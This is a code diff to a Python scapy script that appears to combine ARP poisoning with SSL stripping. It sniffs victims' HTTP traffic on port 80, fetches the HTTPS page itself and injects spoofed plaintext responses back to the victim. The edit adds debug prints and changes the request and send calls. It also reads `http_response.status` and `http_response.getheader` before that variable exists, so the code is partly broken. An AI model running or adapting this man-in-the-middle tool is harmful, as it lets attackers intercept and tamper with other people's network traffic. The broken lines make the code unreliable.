@@ -41,7 +41,7 @@ def run(args):
         arp_poison_thread.join()
 
 def start_sniffing(interface):
-    sniff(iface=interface, filter="tcp port 8080", store=False, prn=ssl_strip)
+    sniff(iface=interface, filter="tcp port 80", store=False, prn=ssl_strip)
 
 def ssl_strip(packet):
     if packet.haslayer(TCP) and packet[IP].dport == 80:
@@ -56,13 +56,22 @@ def ssl_strip(packet):
 
                     https_url = "https://{}{}".format(host, path)
 
+                    print('checkpoint 1')
+
                     context = ssl.create_default_context()
+                    print('checkpoint 1.1')
                     conn = httplib.HTTPSConnection(host, context=context)
-                    conn.request("GET", https_url)
+                    print('checkpoint 1.2')
+                    conn.request("GET", path)
+                    print('checkpoint 1.3')
                     https_response = conn.getresponse()
 
+                    print('checkpoint 2')
+
+                    status_code = http_response.status
                     content_type = https_response.getheader('Content-Type')
                     content_length = https_response.getheader('Content-Length')
+                    location = http_response.getheader('Location')
                     response_body = https_response.read().decode(errors='ignore')
                     
                     http_response = "HTTP/1.1 200 OK\r\n" \
@@ -71,12 +80,14 @@ def ssl_strip(packet):
                                     "Cache-Control: public, max-age=31536000\r\n" \
                                     "\r\n" \
                                     "{}".format(content_type, content_length, response_body)
+                    
+                    print('checkpoint 3')
 
                     # Send the HTTP response to the victim
                     spoofed_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                                        TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="PA") / \
                                        Raw(load=http_response.encode())
-                    send(spoofed_response, verbose=False)
+                    send(spoofed_response, verbose=False, iface=packet.sniffed_on)
                     print("Sent spoofed response")
 
             except Exception as e:
